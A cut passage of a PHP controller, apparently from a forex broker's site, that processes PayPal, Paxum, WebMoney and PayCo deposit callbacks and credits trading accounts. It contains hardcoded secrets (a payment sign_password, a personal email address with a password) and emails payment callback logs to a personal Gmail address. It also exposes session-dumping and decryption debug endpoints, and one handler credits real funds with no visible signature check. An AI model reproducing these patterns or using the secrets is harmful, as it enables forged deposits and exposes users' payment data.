                $account_detail = $this->partners_model->getAccountByUserId($custom_fields['user_id']);
                $account_detail['account_number'] = $account_detail['reference_num'];
            } else {
                $account_detail = $this->account_model->getAccountByUserId($custom_fields['user_id']);
            }
            $stat = strtoupper($this->input->post('payment_status', true)).': '.strtoupper($this->input->post('reason_code', true));
            $data = [
                'account_number' => $account_detail['account_number'],
                'type' => 'PayPal',
                'reason' => $stat,
            ];
            $this->sendEmailFailedDeposit($data);
        }
//        }
//        $email_data = array(
//            'full_name' => 'moniruzzaman',
//            'email' => 'vela.nightclad@gmail.com',
//            'password' => '14563333',
//            'account_number' => $response . '<br/>fp!'
//        );
//        $subject = "Paypal details";
//        $config = array(
//            'mailtype' => 'html'
//        );
//
//        $this->general_model->sendEmail('welcome-html', $subject, $email_data['email'], $email_data, $config);
    }

    /** # paypalNotify METHOD END # **/
    public function sendDepositTestMail()
    {
        $email_data = [
            'full_name' => 'moniruzzaman',
            'email' => 'vela.nightclad@gmail.com',
            'password' => '14563333',
            'account_number' => 'test'.'<br/>fp!',
        ];
        $subject = 'Paypal details';
        $config = [
            'mailtype' => 'html',
        ];

        $this->general_model->sendEmail('welcome-html', $subject, $email_data['email'], $email_data, $config);

        $count = $this->general_model->showssingle3('deposit', 'user_id', 777777, 'status', 2, 'count(*) as counts');

        var_dump($count);
    }

    public function paxumNotification()
    {
        // Getting Raw POST Data
        $rawPostedData = file_get_contents('php://input');

        // Duplicate checking

        $condition = [
            'user_id' => $_POST['user_id'],
            'transaction_id' => $_POST['transaction_id'],
        ];
        if ($this->general_model->whereCondition('paxum_log', $condition)) {
            $insertData = ['data' => serialize($_POST), 'user_id' => $_POST['user_id'], 'transaction_id' => $_POST['transaction_id'], 'type' => 'duplicate'];
            $this->general_model->insertmy('paxum_log', $insertData);

            return false;
        }

        $log_data = ['data' => serialize($_POST), 'user_id' => $_POST['user_id'], 'transaction_id' => $_POST['transaction_id']];
        $this->general_model->insertmy('paxum_log', $log_data);

        // End duplicate checking

        // Extracting Field=Value Pairs
        $i = strpos($rawPostedData, '&key=');
        $fieldValuePairsData = substr($rawPostedData, 0, $i);

        // Calculating Key (Notification Signature)
        $calculatedKey = md5($fieldValuePairsData.$this->paxum_shared_key);

        // Verifying Notification Key (Signature)
        $isValid = $_POST['key'] == $calculatedKey ? true : false;
        $user_data = $this->user_model->getUserAccountTypeById($_POST['user_id']);
        if (!$isValid) {
            $log = 'invalid key: '.$calculatedKey;

            /* Send email for failed deposit **/
            if ($user_data['login_type'] == 1) {
                $account_detail = $this->partners_model->getAccountByUserId($_POST['user_id']);
                $account_detail['account_number'] = $account_detail['reference_num'];
            } else {
                $account_detail = $this->account_model->getAccountByUserId($_POST['user_id']);
            }
            $data = [
                'account_number' => $account_detail['account_number'],
                'type' => 'Paxum',
                'reason' => 'VERIFYING NOTIFICATION KEY/SIGNATURE FAILED',
            ];
            $this->sendEmailFailedDeposit($data);

            FXPP::failedPaymentNotify('paxum', 1, $_POST['user_id'], $data['reason']); //FXPP-9628
        } else {
            if ($_POST['transaction_status'] == 'done') {
                $status = 2;
            } else {
                $status = 0;
            }

            $amount = $_POST['transaction_amount'];
            $currency = $_POST['transaction_currency'];
            $currencyStatus = $this->currency_status[$currency];

            /* FXPP-6333 */
            $isMicro = $this->account_model->isMicro($_POST['user_id']);
            if ($isMicro) {
                $amount *= 100;
                $currencyStatus = $this->currency_status['Cents'];
            }
            /* FXPP-6333 */

            $bonus = $_POST['bonus'];
            $conv_amount = $this->get_convert_amount($currency, $amount);
            $fee = 0;
            $conv_amount_fee = 0;
//            if( in_array($currency, array('EUR', 'USD')) ){
            if ($conv_amount > 0.25) {
                if ($currency != 'USD') {
                    $fee = $this->get_convert_amount($currency, 0.25);
                } else {
                    $fee = 0.25;
                }
                $conv_amount_fee = 0.25;

                $isMicro = $this->account_model->isMicro($_POST['user_id']);
                if ($isMicro) {
                    $fee *= 100;
                    $conv_amount_fee *= 100;
                }

                $amount -= $fee;
                $conv_amount -= $conv_amount_fee;
            }
//            }

            $account_number = $_POST['account_number'];

            $insertDepositFailed = [
                'transaction_id	' => $_POST['transaction_id'],
                'status	' => 0,
                'amount	' => $amount,
                'currency' => $_POST['transaction_currency'],
                'user_id' => $_POST['user_id'],
                'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                'transaction_type' => 'PAXUM',
                'payment_status' => $this->paymentType_status['Deposit via Paxum'], //FXPP-7618
                'currency_status' => $currencyStatus, //FXPP-7618
                'fee' => $fee,
                'isFailed' => 0,
                'type' => 'deposit-'.$isMicro.'-'.$_POST['bonus'],
            ];

            $data = [
                'transaction_id' => $_POST['transaction_id'],
                'reference_id' => 0,
                'status' => $status,
                'amount' => $amount,
                'currency' => $_POST['transaction_currency'],
                'user_id' => $_POST['user_id'],
                'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                'note' => $_POST['transaction_note'],
                'transaction_type' => 'PAXUM',
                'conv_amount' => $conv_amount,
                'payment_status' => $this->paymentType_status['Deposit via Paxum'], //FXPP-7618
                'currency_status' => $currencyStatus, //FXPP-7618
            ];

            if ($fee > 0) {
                $data_fee = [
                    'transaction_id' => $_POST['transaction_id'],
                    'reference_id' => 0,
                    'status' => $status,
                    'amount' => $fee,
                    'currency' => $_POST['transaction_currency'],
                    'user_id' => $_POST['user_id'],
                    'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                    'note' => $_POST['transaction_note'],
                    'transaction_type' => 'PAXUM',
                    'conv_amount' => $conv_amount_fee,
                    'payment_status' => $this->paymentType_status['Deposit via Paxum'], //FXPP-7618
                    'currency_status' => $currencyStatus, //FXPP-7618
                ];
            }

            if ($status == 2) {
                $config = [
                    'server' => 'live_new',
                ];
//                $WebService = new WebService($config);
                $account_number = $_POST['account_number'];

//                if (IPLoc::APIUpgradeDevIP()) {
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAXUM'].$data['transaction_id']);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];
//                } else {
//                    $WebService->update_live_deposit_balance($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAXUM'].$data['transaction_id']);
//                    $requestResult = $WebService->request_status;
//                    $ticket = $WebService->get_result('Ticket');
//                }

                if ($requestResult === 'RET_OK') {
                    $data['mt_ticket'] = $ticket;

                    // Back Agent of Client
                   // FXPP::BackAgentOfAccount($account_number);

                    $WebService2 = new WebService($config);
                    $WebService2->request_live_account_balance($account_number);
                    if ($WebService2->request_status === 'RET_OK') {
                        $balance = $WebService2->get_result('Balance');
                        $this->account_model->updateAccountBalance($account_number, $balance);
                    ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                    } else {
                        $insertDepositFailed['comment'] = $WebService2->request_status;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }
                }

                if ($requestResult != 'RET_OK') {
                    $insertDepositFailed['comment'] = $requestResult;
                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                }

                if ($fee > 0) {
//                    $WebService = new WebService($config);
                    $account_number = $_POST['account_number'];

//                    if (IPLoc::APIUpgradeDevIP()) {
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAXUM'].$data['transaction_id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
//                    } else {
//                        $WebService->update_live_deposit_balance($account_number, $fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAXUM'].$data['transaction_id']);
//                        $requestResult = $WebService->request_status;
//                        $ticket = $WebService->get_result('Ticket');
//                    }

                    if ($requestResult === 'RET_OK') {
                        $data_fee['mt_ticket'] = $ticket;

                        $WebService2 = new WebService($config);
                        $WebService2->request_live_account_balance($account_number);
                        if ($WebService2->request_status === 'RET_OK') {
                            $balance = $WebService2->get_result('Balance');
                            $this->account_model->updateAccountBalance($account_number, $balance);
                        ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                        } else {
                            $insertDepositFailed['comment'] = $WebService2->request_status;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }
                }

                $this->SetAccountAgentPotentialFund($account_number);
            } else {
                /* Send email for failed deposit **/
                if ($user_data['login_type'] == 1) {
                    $account_detail = $this->partners_model->getAccountByUserId($_POST['user_id']);
                    $account_detail['account_number'] = $account_detail['reference_num'];
                } else {
                    $account_detail = $this->account_model->getAccountByUserId($_POST['user_id']);
                }

                $stat = $_POST['transaction_status'];
                $data = [
                    'account_number' => $account_detail['account_number'],
                    'type' => 'Paxum',
                    'reason' => $stat,
                ];
                $this->sendEmailFailedDeposit($data);
            }

            $log = '';
            foreach ($_POST as $key => $value) {
                $log .= $key.'='.$value.'&';
            }

            if (!$this->deposit_model->insertPayment($data)) {
                $asset_user_docs=$this->config->item('asset_user_docs');
                file_put_contents($asset_user_docs.'paxum.log', $log.PHP_EOL, FILE_APPEND);
            }

            if ($fee > 0) {
                if (!$this->deposit_model->insertPayment($data_fee)) {
                    $asset_user_docs=$this->config->item('asset_user_docs');
                    file_put_contents($asset_user_docs.'paxum.log', $log.PHP_EOL, FILE_APPEND);
                }
            }
//             FXPP::updateAccountTradingStatus($account_number,$_POST['user_id']); // for pro accounts

            if (IPLoc::APIUpgradeDevIP()) {
                FXPP::updateAccountTradingStatusV2($account_number, $_POST['user_id']); // for pro accounts
            } else {
                FXPP::updateAccountTradingStatus($account_number, $_POST['user_id']); // for pro accounts
            }

//            if ($_POST['bonus'] == 'twpb') {
//                FXPP::DepositBonus($_POST['user_id'], $account_number, ($amount + $fee), 'paxum', 'twpb', $data['transaction_id']);
//            }
//
//            if ($_POST['bonus'] == 'tpb') {
//                FXPP::DepositBonus($_POST['user_id'], $account_number, ($amount + $fee), 'paxum', 'tpb', $data['transaction_id']);
//            }
//            if ($_POST['bonus'] == 'fpb') {
//                FXPP::DepositBonus($_POST['user_id'], $account_number, ($amount + $fee), 'paxum', 'fpb', $data['transaction_id']);
//            }
//            if ($_POST['bonus'] == 'hpb') {
//                FXPP::Deposit100PercentBonus($_POST['user_id'], $account_number, ($amount + $fee), 'paxum', 'hplb', $data['transaction_id']);
//            }
//            if (IPLoc::Office()) {
//                if ($_POST['bonus'] === 'rhpb') {
//                    FXPP::DepositRegular100PercentBonus($_POST['user_id'], $account_number, ($amount + $fee), 'paxum', 'rhpb', $data['transaction_id']);
//                }
//            }

            self::applyDepositBonus($_POST['user_id'], $account_number, ($amount + $fee), 'paxum', $_POST['bonus'], $data['transaction_id'], false);

            $RequestLogintype = $this->account_model->getAccountLoginType($_POST['user_id']);
            $bonuses = FXPP::getAccountBonusByType($account_number);
            $paxum_amount = $amount + $fee;
            if ($RequestLogintype['login_type'] != 1) {
                if ($paxum_amount > 0 and $bonuses[2] > 0) {
                    FXPP::BonusProfitCancellation($_POST['user_id'], $account_number, $paxum_amount, $data['transaction_id']);
                }
            }

            // Bonus Profit Logs**/
            $ndbProfitLogs = [
                'Account_number' => $account_number,
                'DepAmount' => $paxum_amount,
                'UserId' => $_POST['user_id'],
                'TransactionId' => $data['transaction_id'],
                'ndbbonus' => $bonuses[2],
            ];
            $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
            $insertProfitLogs = [
                'logs' => $encodeNdbProfitLogs,
                'User_Id' => $_POST['user_id'],
            ];

            $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

//            file_put_contents('/var/www/html/my.forexmart.com/assets/user_docs/paxum.log', $log.PHP_EOL , FILE_APPEND);

            /**  Use original amount for Cent accounts**/
            $processed_amount = floatval($conv_amount) + floatval($fee);
            $isMicro = $this->account_model->isMicro($data['user_id']);
            if ($isMicro) {
                $processed_amount /= 100;
            }
            /* End **/

            if ($status == 2) {
                /* Send successful email deposit to auto-reports **/
                $this->sendEmailAfterSuccessDeposit('Paxum', $processed_amount, $account_number, $data['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['PAXUM'].$data['transaction_id']);
                /* End **/
            }
        }
        $email_data = [
            'full_name' => 'vela',
            'email' => 'vela.nightclad@gmail.com',
            'password' => '14563333',
            'account_number' => '',
        ];
        $subject = 'Paxum details';

        $this->load->library('email');

        $this->email->from('noreply@mail.forexmart.com', 'ForexMart');
        $this->email->reply_to('noreply@mail.forexmart.com', 'ForexMart');
        $this->email->to($email_data['email']);
        $this->email->subject($subject);
        $this->email->message($log);
        $this->email->send();
    }

    public function webmoneyNotification()
    {
        $this->load->library('WebToPay');
        $log = '';
        try {
            $response = WebToPay::checkResponse($_GET, [
                'projectid' => 71720,
                'sign_password' => 'cda72177eba360ff16b7f836e2754370',
            ]);

//            if ($response['test'] !== '0') {
//                throw new Exception('Testing, real payment was not made');
//            }
//            if ($response['type'] !== 'macro') {
//                throw new Exception('Only macro payment callbacks are accepted');
//            }
            $date = new DateTime();
            $order_number = $date->getTimestamp();
            $status = $response['status'];
            $amount = $response['amount'] / 100;

            /* FXPP-6333 */
            $isMicro = $this->account_model->isMicro($response['user_id']);
            if ($isMicro) {
                $amount = $response['amount'];
            }
            /* FXPP-6333 */

            $currency = $response['currency'];
            $conv_amount = $this->get_convert_amount($currency, $amount);

            $data = [
                'transaction_id' => $response['orderid'],
                'reference_id' => $order_number,
                'status' => $this->paysera_status[$status],
                'amount' => $amount,
                'currency' => $response['currency'],
                'user_id' => $response['user_id'],
                'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                'note' => $response['paytext'],
                'transaction_type' => 'WEBMONEY',
                'conv_amount' => $conv_amount,
            ];

            if ($status == 1) {
                $config = [
                    'server' => 'live_new',
                ];
//                $WebService = new WebService($config);
                $account_number = $response['account_number'];

//                if (IPLoc::APIUpgradeDevIP()) {
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['WEBMONEY'].$data['transaction_id']);
                    $requestResult = $WebServiceNew['requestResult'];
//                } else {
//                    $WebService->update_live_deposit_balance($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['WEBMONEY'].$data['transaction_id']);
//                    $requestResult = $WebService->request_status;
//                }

                if ($requestResult === 'RET_OK') {
                    // Back Agent of Client
                   // FXPP::BackAgentOfAccount($account_number);

                    $WebService2 = new WebService($config);
                    $WebService2->request_live_account_balance($account_number);
                    if ($WebService2->request_status === 'RET_OK') {
                        $balance = $WebService2->get_result('Balance');
                        $this->account_model->updateAccountBalance($account_number, $balance);
                        ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                    }
                }
            }

            foreach ($response as $key => $value) {
                $log .= $key.'='.$value.'<br/>';
            }

            if (!$this->deposit_model->insertPayment($data)) {
                $asset_user_docs=$this->config->item('asset_user_docs');
                file_put_contents($asset_user_docs.'webmoney.log', $log.PHP_EOL, FILE_APPEND);
            }
        } catch (Exception $e) {
            $log .= get_class($e).': '.$e->getMessage();
        }

        $email_data = [
            'full_name' => 'vela',
            'email' => 'vela.nightclad@gmail.com',
            'account_number' => '',
        ];
        $subject = 'Webmoney details';

        $this->load->library('email');

        $this->email->from('noreply@mail.forexmart.com', 'ForexMart');
        $this->email->reply_to('noreply@mail.forexmart.com', 'ForexMart');
        $this->email->to($email_data['email']);
        $this->email->subject($subject);
        $this->email->message($log);
        $this->email->send();
    }

    public function paycoNotification()
    {
        $rawPostedData = file_get_contents('php://input');
        $asset_user_docs=$this->config->item('asset_user_docs');
        file_put_contents($asset_user_docs.'payco.log', $rawPostedData.PHP_EOL, FILE_APPEND);
    }

    public function paycoreturn()
    {
        $data['payco_session'] = [
            'payco_start' => 2,
        ];
        $this->session->set_userdata($data['payco_session']);
        $this->euRedirect();
        redirect(FXPP::loc_url('deposit/payco'));
    }

    public function paycocancel()
    {
        $data['payco_session'] = [
            'payco_start' => 1,
        ];
        $this->session->set_userdata($data['payco_session']);

        $data['data'] = [
            'status' => '1', // status 1 is cancel
        ];
        $data['data']['return'] = $this->g_m->updatemy($table = 'deposit', 'id', $_SESSION['payco_insert_id'], $data['data']);
        $this->euRedirect();
        redirect(FXPP::loc_url('deposit/payco'));
    }

    public function paycostatus()
    {
//        $this->db->trans_begin();
        parse_str(file_get_contents('php://input'), $_POST);
        $json_encoded = json_encode($_POST);
        $json = json_decode(json_encode($_POST), true);

        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address(), 'type' => 'PAYCO'];
        $this->general_model->insertmy('fasapay_log', $insertData);

//                $email_data = array(
//                    'full_name' => 'ptog test',
//                    'email' => '',
//                    'password' => $json['paytrans'],
//                    'account_number' => $json_encoded
//                );
//                $subject = "Payco details";
//                $config = array(
//                    'mailtype' => 'html'
//                );
//                $this->general_model->sendEmail('welcome-html', $subject, $email_data['email'], $email_data, $config);

        //        if($json['trn']===$_SESSION['payco_tr_id']){

        $data['insert'] = [
            'status' => 2, // status 2 is successful deposit
        ];
        $data['data']['return'] = $this->g_m->updatemy($table = 'deposit', 'reference_id', $json['tid'], $data['insert']);
        $data['deposit'] = $this->g_m->showssingle($table = 'deposit', 'reference_id', $json['tid'], 'id,user_id,amount,conv_amount,transaction_id,thirtypercentbonus,fiftypercentbonus,twentypercentbonus,tenpercentbonus,hundredpercentbonus,fiftypercentlimitedbonus,currency', '');
        $walletCurrency = $data['deposit']['currency'];
        /* FXPP-6333 */
        $isMicro = $this->account_model->isMicro($data['deposit']['user_id']);
        if ($isMicro) {
            $json['amt'] *= 100;
        }
        /* FXPP-6333 */

        $user_check = $this->g_m->showssingle($table = 'users', 'id', $data['deposit']['user_id'], '*', '');
        $login_type = $user_check['login_type'];
        if ($login_type == 1) {
            $data['mt_accounts_set'] = $this->g_m->showssingle($table = 'partnership', 'partner_id', $data['deposit']['user_id'], 'reference_num, currency', '');
            $data['mt_accounts_set']['account_number'] = $data['mt_accounts_set']['reference_num'];
            $accountCurrency = $data['mt_accounts_set']['currency'];
        } else {
            $data['mt_accounts_set'] = $this->g_m->showssingle($table = 'mt_accounts_set', 'user_id', $data['deposit']['user_id'], 'account_number, mt_currency_base', '');
            $accountCurrency = $data['mt_accounts_set']['mt_currency_base'];
        }
        $trid = $json['paytrans'];
        settype($trid, gettype(intval((int) $trid)));
        $data['insert2'] = [
            'deposit_id' => $data['deposit']['id'],
            'wallet' => $json['wallet'],
            'sign' => $json['sign'],
            'trn' => $json['trn'],
            'paytrans' => $trid,
            'tid' => $json['tid'],
            'acc' => $data['mt_accounts_set']['account_number'],
        ];
        $data['payco_insert_id'] = $this->g_m->insert($table = 'payco', $data['insert2']);

        $data['insertnew'] = [
            'transaction_id' => $trid,
        ];
        $data['data']['return'] = $this->g_m->updatemy($table = 'deposit', 'reference_id', $json['tid'], $data['insertnew']);
        $config = [
            'server' => 'live_new',
        ];
        $tr_id = (string) $trid;

        $amount = $json['amt'];
        $convertAmt = $amount;
        if ($walletCurrency != $accountCurrency) {
            $convertAmt = $this->get_convert_amount($walletCurrency, $amount, $accountCurrency);
        }

        $account_number = $data['mt_accounts_set']['account_number'];
//        $WebServiceForPayCo = new WebService($config);

        // if($data['deposit']['user_id'] == 369115){
        $WebServiceNew = FXPP::DepositRealFund($account_number, $amount, $comment = $this->comment_type['deposit'].$this->comment_transaction_type['PAYCO'].$this->clean($tr_id));
        $requestResult = $WebServiceNew['requestResult'];
        $ticket = $WebServiceNew['ticket'];
        /* }else{
             $WebServiceForPayCo->update_live_deposit_balance($account_number, $amount, $comment = $this->comment_type['deposit'] . $this->comment_transaction_type['PAYCO'] . $this->clean($tr_id));
             $requestResult = $WebServiceForPayCo->request_status;
             $ticket        = $WebServiceForPayCo->get_result('Ticket');
         }*/

        if ($requestResult === 'RET_OK') {
            $data['mt_ticket'] = $ticket;

            /*Move saving of ticket here*/
            $data['insert_ticket'] = [
                'mt_ticket' => $data['mt_ticket'], // save ticket.
            ];
            $data['data']['return'] = $this->g_m->updatemy($table = 'deposit', 'reference_id', $json['tid'], $data['insert_ticket']);
            /*Move saving of ticket here*/

            // Deposit Bonus 30% / 50% 20%
//             FXPP::updateAccountTradingStatus($account_number,$data['deposit']['user_id']); // for pro accounts

            /*if(IPLoc::APIUpgradeDevIP()){
                FXPP::updateAccountTradingStatusV2($account_number,$data['deposit']['user_id']); // for pro accounts
            }else{*/
            FXPP::updateAccountTradingStatus($account_number, $data['deposit']['user_id']); // for pro accounts
            //}

            if ($data['deposit']['tenpercentbonus'] == 1) {
                self::applyDepositBonus($data['deposit']['user_id'], $account_number, $convertAmt, 'payco', 'twpb', $data['deposit']['transaction_id'], true);
            }

            if ($data['deposit']['twentypercentbonus'] == 1) {
                self::applyDepositBonus($data['deposit']['user_id'], $account_number, $convertAmt, 'payco', 'twpb', $data['deposit']['transaction_id'], false);
            }

            if ($data['deposit']['thirtypercentbonus'] == 1) {
                self::applyDepositBonus($data['deposit']['user_id'], $account_number, $convertAmt, 'payco', 'tpb', $data['deposit']['transaction_id'], false);
            }

            if ($data['deposit']['fiftypercentbonus'] == 1) {
                self::applyDepositBonus($data['deposit']['user_id'], $account_number, $convertAmt, 'payco', 'fpb', $data['deposit']['transaction_id'], false);
            }

            if ($data['deposit']['hundredpercentbonus'] == 1) {
                self::applyDepositBonus($data['deposit']['user_id'], $account_number, $convertAmt, 'payco', 'hplb', $data['deposit']['transaction_id'], false);
            }

            // Back Agent of Client
            //FXPP::BackAgentOfAccount($account_number);

            $WebService2 = new WebService($config);
            $WebService2->request_live_account_balance($account_number);
            if ($WebService2->request_status === 'RET_OK') {
                $balance = $WebService2->get_result('Balance');
                if ($login_type == 1) {
                    $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                } else {
                    $this->account_model->updateAccountBalance($account_number, $balance);
                }

                ////FXPP::extraCommission($account_number,$json['amt'],$json['tid']);  // Exatra commission update
                /**  Use original amount for Cent accounts**/
                $isMicro = $this->account_model->isMicro($data['deposit']['user_id']);
                if ($isMicro) {
                    $processed_amount = floatval($data['deposit']['conv_amount'] / 100);
                } else {
                    $processed_amount = $data['deposit']['conv_amount'];
                }
                /* End **/

                /* Send successful email deposit to auto-reports **/
                $this->sendEmailAfterSuccessDeposit('PayCo', $processed_amount, $account_number, $data['deposit']['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['PAYCO'].$this->clean($tr_id));
            /* End **/
            } else {
                $data['web2'] = [
                    'webservice2' => $WebService2->request_status,
                ];
                $data['payco_insert_id'] = $this->g_m->updatemy($table = 'payco', 'id', $data['payco_insert_id'], $data['web2']);
            }

            /*            $data['insert_ticket'] = array(
                'mt_ticket' => $data['mt_ticket']// save ticket.
            );
            $data['data']['return'] = $this->g_m->updatemy($table = "deposit", "reference_id", $json['tid'], $data['insert_ticket']);*/
        } else {
            $data['web1'] = [
                'webservice1' => $requestResult,
            ];
            $data['payco_insert_id'] = $this->g_m->updatemy($table = 'payco', 'id', $data['payco_insert_id'], $data['web1']);
        }

//        if ($this->db->trans_status() === FALSE) {
//            $this->db->trans_rollback();
//        } else {
//            $this->db->trans_commit();
//        }

        // Sending email to cancelled transaction
        if (isset($json)) {
            if ($json['status'] != 1) {
                if ($login_type == 1) {
                    $account_detail = $this->partners_model->getAccountByUserId($data['deposit']['user_id']);
                    $account_detail['account_number'] = $account_detail['reference_num'];
                } else {
                    $account_detail = $this->account_model->getAccountByUserId($data['deposit']['user_id']);
                }

                $status_msg = [
                    0 => 'FAILED',
                    2 => 'PENDING',
                    3 => 'CANCELLED',
                ];
                $details = [
                    'account_number' => $account_detail['account_number'],
                    'type' => 'PayCo',
                    'reason' => $status_msg[$json['status']],
                ];
                $this->sendEmailFailedDeposit($details);

                $this->g_m->insert('payco_log_cancel', ['user_id' => $data['deposit']['user_id'], 'txn_id' => $data['deposit']['transaction_id'], 'log' => serialize($details)]);

                if ($json['status'] == 0) { //failed transaction only
                    FXPP::failedPaymentNotify('payco', 1, $data['deposit']['user_id'], 'Transaction Failed.'); //FXPP-9628
                }

                if ($json['status'] == 0 || $json['status'] == 2) { //FXPP-12707
                    $sendPending = [
                        'account_number' => $details['account_number'],
                        'time' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'payment_type' => $details['type'],
                        'amount' => $data['deposit']['amount'],
                        'transaction_id' => $data['deposit']['transaction_id'],
                    ];

                    if (IPLoc::APIUpgradeDevIP()) {
                        $this->load->library('Fx_mailer');
                        Fx_mailer::pending_deposit_with_issues($sendPending, 'forexmart.tester5@gmail.com');
                        Fx_mailer::pending_deposit_with_issues($sendPending, 'agus@forexmart.com');
//                        Fx_mailer::pending_deposit_with_issues($sendPending, "finance@forexmart.com");
                    }
                }
            }
        }
    }

    public function decryptcode()
    {
        echo FXPP::decrypt_data('ISNRYXhkohDWyBuGFegWR2bztSJSMbDwr/S0laR+8MMrGcXKQFWt91hb3Nrx29mT', $this->encrypt_key);
    }

    public function SetAccountAgentPotentialFund($accountNumber)
    {
        $webservice_config = ['server' => 'live_new'];
//        $WebService2 = new WebService($webservice_config);
//        $WebService2->RequestAccountFunds($accountNumber);
//        $TotalRealFund = $WebService2->get_result('TotalRealFund');
//        $TotalBonusFund = $WebService2->get_result('TotalBonusFund');

        if (IPLoc::APIUpgradeDevIP()) {
            $this->load->library('WSV'); //New web service
            $WSV = new WSV();
            $WebService2 = $WSV->GetAccountFunds($accountNumber);

            if ($WebService2->request_status === 'RET_OK') {
                $TotalRealFund = $WebService2->result['TotalRealFund'];
                $TotalBonusFund = $WebService2->result['TotalBonusFund'];
            }
        } else {
            $WebService2 = new WebService($webservice_config);
            $WebService2->RequestAccountFunds($accountNumber);

            $TotalRealFund = $WebService2->get_result('TotalRealFund');
            $TotalBonusFund = $WebService2->get_result('TotalBonusFund');
        }

        if ($TotalRealFund >= $TotalBonusFund) {
            //real fund is greater than or equal to bonus
            $getAffiliateCodeByAccountNumber = $this->account_model->getAffiliateCodeByAccountNumber($accountNumber);
            $referralAffiliateCode = $getAffiliateCodeByAccountNumber['referral_affiliate_code'];
            if ($referralAffiliateCode) {
                $getAccountNumberByAffiliateCode = $this->account_model->getAccountNumberByAffiliateCode($referralAffiliateCode);

                $AgentAccountNumber = $getAccountNumberByAffiliateCode[0]['reference_num'] ? $getAccountNumberByAffiliateCode[0]['reference_num'] : $getAccountNumberByAffiliateCode[0]['account_number'];
                $service_data = [
                    'AccountNumber' => $accountNumber,
                    'AgentAccountNumber' => $AgentAccountNumber,
                ];

                $webservice_config = [
                    'server' => 'live_new',
                ];

//                $WebService = new WebService($webservice_config);
//                $WebService->SetAccountAgent($service_data);
//                if ($WebService->request_status === 'RET_OK') {
//
//                }

                /* if(IPLoc::APIUpgradeDevIP()){
                     $this->load->library('WSV'); //New web service
                     $WSV = new WSV();
                     $WebService = $WSV->SetAccountDetail($service_data, "SetAgentAccount");
                 }else{*/
                $WebService = new WebService($webservice_config);
                $WebService->SetAccountAgent($service_data);
                //}
            }
        }
    }

    public function Ses()
    {
        var_dump($_SESSION);
    }

    private function checkOrder($request)
    {
        $response = null;
        if ($request['orderSumAmount'] < 100) {
            $response = $this->buildResponse($request['action'], $request['invoiceId'], $request['shopId'], 100, 'The amount should be more than 100 rubles.');
        } else {
            $response = $this->buildResponse($request['action'], $request['invoiceId'], $request['shopId'], 0);
        }

        return $response;
    }

    private function paymentAviso($request)
    {
        return $this->buildResponse($request['action'], $request['invoiceId'], $request['shopId'], 0);
    }

    private function buildResponse($functionName, $invoiceId, $shopId, $result_code, $message = null)
    {
        try {
            $performedDatetime = $this->formatDate(new DateTime());
            $response = '<?xml version="1.0" encoding="UTF-8"?><'.$functionName.'Response performedDatetime="'.$performedDatetime.'" code="'.$result_code.'" '.($message != null ? 'message="'.$message.'"' : '').' invoiceId="'.$invoiceId.'" shopId="'.$shopId.'"/>';

            return $response;
        } catch (\Exception $e) {
            //  $this->log($e);
        }

        return null;
    }

    private function sendResponse($responseBody)
    {
        header('HTTP/1.0 200');
        header('Content-Type: application/xml');
        echo $responseBody;
        exit;
    }

    public static function formatDate(\DateTime $date)
    {
        $performedDatetime = $date->format('Y-m-d').'T'.$date->format('H:i:s').'.000'.$date->format('P');

        return $performedDatetime;
    }

    public function deposit_20PercentBonus($account_number, $bonus, $mtComments = 'FOREXMART WELCOME BONUS 20%')
    {
        $webservice_config = [
            'server' => 'live_new',
        ];
        $WebService = new WebService($webservice_config);
        $account_info = [
            'AccountNumber' => $account_number,
            'Amount' => $bonus,
            'Comment' => $mtComments,
            'ProcessByIP' => $this->input->ip_address(),
        ];
        $WebService->open_Deposit_20PercentBonus($account_info);
        if ($WebService->request_status === 'RET_OK') {
            $WebService2 = new WebService($webservice_config);
            $WebService2->request_live_account_balance($account_number);
            if ($WebService2->request_status === 'RET_OK') {
                $amount = $WebService2->get_result('Balance');
                $this->account_model->updateAmountByAccountNumber($account_number, $amount);

                return true;
            }
        }

        return false;
    }

    public function deposit_30PercentBonus($account_number, $bonus, $mtComments = 'FOREXMART WELCOME BONUS 30%')
    {
        $webservice_config = [
            'server' => 'live_new',
        ];
//        $WebService = new WebService($webservice_config);
        $account_info = [
            'AccountNumber' => $account_number,
            'Amount' => $bonus,
            'Comment' => $mtComments,
            'ProcessByIP' => $this->input->ip_address(),
        ];

//        if(IPLoc::APIUpgradeDevIP() || IPLoc::Office()){
            $webserviceResult =  FXPP::CreditBonus('BONUS_30_PERCENT', $bonus, $mtComments, $account_number);
            $reqResult   = $webserviceResult['ErrorMessage'];
//            $bonusTicket = $webserviceResult['Data']->Ticket;
